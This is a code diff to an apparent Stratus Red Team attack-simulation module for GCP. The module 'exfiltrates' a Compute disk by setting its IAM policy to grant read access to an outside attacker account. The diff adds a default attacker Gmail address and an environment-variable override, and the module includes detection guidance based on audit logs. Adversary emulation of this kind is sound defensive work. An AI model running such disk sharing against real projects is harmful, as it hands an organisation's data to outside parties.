@@ -5,6 +5,8 @@ import (
 	"context"
 	computepb "google.golang.org/genproto/googleapis/cloud/compute/v1"
 	"log"
+	"os"
+	"strings"
 
 	_ "embed"
 	"fmt"
@@ -31,6 +33,17 @@ Warm-up:
 Detonation:
 
 - Set the IAM policy of the disk so that the attacker account has permissions to read the disk in their own project
+
+!!! note
+
+	Since the target e-mail must exist for this attack simulation to work, Stratus Red Team grants the role to ` + DefaultFictitiousAttackerEmail + ` by default.
+	This is a real Google account, owned by Stratus Red Team maintainers and that is not used for any other purpose than this attack simulation. However, you can override
+	this behavior by setting the environment variable <code>` + AttackerEmailEnvVarKey + `</code>, for instance:
+
+	` + codeBlock + `bash
+	export ` + AttackerEmailEnvVarKey + `="your-own-gmail-account@gmail.com"
+	stratus detonate ` + AttackTechniqueId + `
+	` + codeBlock + `
 `,
 		Detection: `
 You can detect when someone changes the IAM policy of a Compute Disk, using the GCP Admin Activity audit logs event <code>v1.compute.disks.setIamPolicy</code>. Here's a sample event, shortened for clarity:
@@ -125,11 +138,14 @@ NOT protoPayload.authenticationInfo.principalEmail=~".+@your-domain.tld$"
 	})
 }
 
+const DefaultFictitiousAttackerEmail = "stratusredteam@gmail.com"
+const AttackerEmailEnvVarKey = "STRATUS_RED_TEAM_ATTACKER_EMAIL"
+
 func detonate(params map[string]string, providers stratus.CloudProviders) error {
 	gcp := providers.GCP()
 	diskName := params["disk_name"]
 	zone := params["zone"]
-	attackerEmail := "christophe@somewhereinthe.cloud"
+	attackerEmail := getAttackerEmail()
 
 	log.Println("Exfiltrating " + diskName + " by sharing it with a fictitious attacker")
 	err := shareDisk(gcp, diskName, zone, attackerEmail)
@@ -203,4 +219,12 @@ func unshareDisk(gcp *providers.GCPProvider, diskName string, zone string) error
 		return fmt.Errorf("unable to set iam policy: %w", err)
 	}
 	return nil
+}
+
+func getAttackerEmail() string {
+	if attackerEmail := os.Getenv(AttackerEmailEnvVarKey); attackerEmail != "" {
+		return strings.ToLower(attackerEmail)
+	} else {
+		return DefaultFictitiousAttackerEmail
+	}
 }
